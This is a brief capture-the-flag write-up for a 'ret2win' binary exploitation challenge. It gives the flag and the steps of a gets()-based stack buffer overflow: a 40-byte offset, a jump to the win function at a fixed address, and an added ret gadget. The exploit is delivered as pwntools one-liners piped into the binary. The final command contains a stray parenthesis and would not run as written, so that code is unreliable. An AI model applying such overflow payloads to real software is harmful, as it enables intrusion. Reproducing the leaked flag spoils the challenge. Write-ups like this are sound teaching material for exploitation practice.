# ret2win
can you pwn the binary?

## Flag
enc0re{r37_too_w1N}

## Solution
1. debugging the binary gdb shows that gets() is used which leads to buffer overflow
2. Using pwn cyclic and dmesg, you will find that the buffer is 40 bytes
3. the flag function is located at `0x00401162`
4. Simple jump address should work 
`python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*40 + p64(0x00401162))" | ./vuln`
5. But it still doesn't give the flag so after debugging more, you will find that rip is not overwritten by the flag address, so we add ret instruction before jumping to flag function
6. `python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*40 + p64(0x000401016)) + p64(0x000401162)); print('\n')" | ./vuln`

